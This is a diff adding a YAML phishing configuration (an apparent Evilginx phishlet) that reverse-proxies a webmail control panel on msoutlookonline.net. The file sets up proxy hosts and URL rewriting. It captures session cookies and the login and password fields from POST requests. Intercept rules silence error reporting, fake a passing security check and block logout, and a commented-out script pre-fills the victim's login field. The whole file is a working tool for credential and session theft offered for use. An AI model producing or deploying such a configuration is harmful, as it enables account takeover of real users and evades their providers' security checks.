@@ -1,0 +1,201 @@
+min_ver: "3.0.0"
+redirect_url: "https://controlpanel.msoutlookonline.net/Portal/ADUser/Dashboard"
+
+proxy_hosts:
+  - {
+      phish_sub: "controlpanel",
+      orig_sub: "controlpanel",
+      domain: "msoutlookonline.net",
+      session: true,
+      is_landing: true,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "portal",
+      orig_sub: "Portal",
+      domain: "msoutlookonline.net",
+      session: true,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "static",
+      orig_sub: "static",
+      domain: "msoutlookonline.net",
+      session: false,
+      auto_filter: true,
+    }
+
+sub_filters:
+  # Core msoutlookonline.net domain replacements
+  - {
+      triggers_on: "controlpanel.msoutlookonline.net",
+      orig_sub: "controlpanel",
+      domain: "msoutlookonline.net",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes:
+        ["text/html", "text/css", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "controlpanel.msoutlookonline.net",
+      orig_sub: "Portal",
+      domain: "msoutlookonline.net",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes:
+        ["text/html", "text/css", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "controlpanel.msoutlookonline.net",
+      orig_sub: "",
+      domain: "msoutlookonline.net",
+      search: "{hostname}",
+      replace: "{hostname}",
+      mimes:
+        ["text/html", "text/css", "application/json", "application/javascript"],
+    }
+
+  # Portal/ADUser path handling
+  - {
+      triggers_on: "controlpanel.msoutlookonline.net",
+      orig_sub: "controlpanel",
+      domain: "msoutlookonline.net",
+      search: "/Portal/ADUser",
+      replace: "/Portal/ADUser",
+      mimes: ["text/html", "application/javascript"],
+    }
+
+  # Static assets and CDN
+  - {
+      triggers_on: "controlpanel.msoutlookonline.net",
+      orig_sub: "static",
+      domain: "msoutlookonline.net",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes: ["text/css", "application/javascript", "image/*", "font/*"],
+    }
+
+  # Return URL handling
+  - {
+      triggers_on: "controlpanel.msoutlookonline.net",
+      orig_sub: "controlpanel",
+      domain: "msoutlookonline.net",
+      search: 'returnUrl=([^&"]*)',
+      replace: "returnUrl=https%3A%2F%2F{hostname}%2FPortal%2FADUser%2FLogin",
+      mimes: ["text/html", "application/json"],
+    }
+
+auth_tokens:
+  # Capture msoutlookonline.net session cookies (ADUser/Portal)
+  - domain: ".msoutlookonline.net"
+    keys:
+      [
+        ".AspNetCore.",
+        "ADUserSession",
+        "PortalAuth",
+        "session_id:regexp",
+        "auth_token:regexp",
+      ]
+    type: "cookie"
+  - domain: ".controlpanel.msoutlookonline.net"
+    keys:
+      ["controlpanel_session", "webmail_session:regexp", "rememberMe:always"]
+    type: "cookie"
+
+credentials:
+  username:
+    key: "login"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+  # custom:
+  #   - key: "returnUrl"
+  #     search: "(.*)"
+  #     type: "post"
+  #   - key: "clientType"
+  #     search: "(.*)"
+  #     type: "post"
+  #   - key: "rememberMe"
+  #     search: "(.*)"
+  #     type: "post"
+
+auth_urls:
+  # - "/Portal/User/Login"
+  - "/Portal/User/Dashboard"
+  - "/Portal/Dashboard"
+  - "/Dashboard"
+  - "/Home"
+  - "/api/auth/success"
+  - "/Portal/.*dashboard.*"
+
+login:
+  domain: "controlpanel.msoutlookonline.net"
+  path: "/Portal/User/Login"
+
+
+
+# js_inject:
+#   # Pre-fill email and focus password + set rememberMe
+#   - trigger_domains: ["controlpanel.msoutlookonline.net"]
+#     trigger_paths: ["/Portal/ADUser/Login"]
+#     trigger_params: ["username"]
+#     script: |
+#       function msoutlookAutofill() {
+#         var loginField = document.querySelector('input[name="login"], input[id*="login"], input[placeholder*="email"]');
+#         var passwordField = document.querySelector('input[name="password"], input[type="password"]');
+#         var rememberField = document.querySelector('input[name="rememberMe"]');
+        
+#         if (loginField && "{username}") {
+#           loginField.value = "{username}";
+#         }
+        
+#         if (passwordField) {
+#           passwordField.focus();
+#           passwordField.select();
+#         }
+        
+#         if (rememberField && rememberField.type === 'checkbox') {
+#           rememberField.checked = true;
+#         }
+        
+#         // Set hidden clientType if present
+#         setTimeout(function() {
+#           var clientType = document.querySelector('input[name="clientType"]');
+#           if (clientType && !clientType.value) {
+#             clientType.value = 'WebMail';
+#           }
+#         }, 500);
+#       }
+
+#       if (document.readyState === 'loading') {
+#         document.addEventListener('DOMContentLoaded', msoutlookAutofill);
+#       } else {
+#         setTimeout(msoutlookAutofill, 500);
+#       }
+
+intercept:
+  # Block error reporting, security checks, and logout
+  - {
+      domain: "controlpanel.msoutlookonline.net",
+      path: "^/Portal/log|report|error.*$",
+      http_status: 200,
+      body: "{}",
+      mime: "application/json",
+    }
+  - {
+      domain: "controlpanel.msoutlookonline.net",
+      path: "^/api/security|check.*$",
+      http_status: 200,
+      body: '{"valid": true}',
+      mime: "application/json",
+    }
+  - {
+      domain: "controlpanel.msoutlookonline.net",
+      path: "^/Portal/ADUser/Logout$",
+      http_status: 302,
+      body: "",
+      mime: "text/html",
+    }
